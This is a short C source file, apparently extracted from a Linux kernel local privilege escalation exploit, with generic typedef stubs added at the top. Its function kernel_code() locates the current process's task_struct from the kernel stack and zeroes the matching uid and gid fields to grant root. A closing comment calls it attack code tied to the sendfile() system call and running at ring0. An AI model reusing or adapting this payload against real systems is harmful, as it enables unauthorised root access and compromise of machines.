#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 unsigned long gid ; 
 unsigned long uid ; 

void kernel_code()
{
	unsigned long where=0;
	unsigned long *pcb_task_struct;

	where=(unsigned long )&where;
	where&=~8191;
	pcb_task_struct=(unsigned long *)where;

	while(pcb_task_struct){
		if(pcb_task_struct[0]==uid&&pcb_task_struct[1]==uid&&
			pcb_task_struct[2]==uid&&pcb_task_struct[3]==uid&&
			pcb_task_struct[4]==gid&&pcb_task_struct[5]==gid&&
			pcb_task_struct[6]==gid&&pcb_task_struct[7]==gid){
			pcb_task_struct[0]=pcb_task_struct[1]=pcb_task_struct[2]=pcb_task_struct[3]=0;
			pcb_task_struct[4]=pcb_task_struct[5]=pcb_task_struct[6]=pcb_task_struct[7]=0;
			break;
		}
		pcb_task_struct++;
	}
	return;
	/*
	** By calling iret after pushing a register into kernel stack,
	** We don't have to go back to ring3(user mode) privilege level. dont worry. :-}
	**
	** kernel_code() function will return to its previous status which means before sendfile() system call,
	** after operating upon a ring0(kernel mode) privilege level.
	** This will enhance the viablity of the attack code even though each kernel can have different CS and DS address.
	*/
}